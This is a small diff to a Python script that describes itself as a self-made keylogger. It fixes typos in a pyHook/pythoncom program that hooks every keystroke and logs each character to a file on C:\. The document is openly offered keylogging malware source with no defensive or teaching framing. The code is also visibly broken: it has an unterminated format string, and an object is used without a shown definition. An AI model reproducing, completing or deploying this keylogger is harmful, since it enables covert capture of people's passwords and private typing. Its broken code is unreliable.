@@ -1,10 +1,10 @@
 Self made Python keylogger using module PyHook,pythoncon and logging module .
 
 import pyHook
-import pythoncon
+import pythoncom
 import logging
 
-file log = 'C:\\New\\log.txt'
+file_log = 'C:\\New\\log.txt'
 def OnKeyboardEvent(event):
   logging.basicConfig(filename=file_log,level=logging.DEBUG,format=%(message)s'
   logging.log(10,chr(event.Ascii))
@@ -14,4 +14,4 @@ def OnKeyboardEvent(event):
  hooks_manager.HookKeyboard()
  pythoncom.PumpMessages()
  
-  
+                      
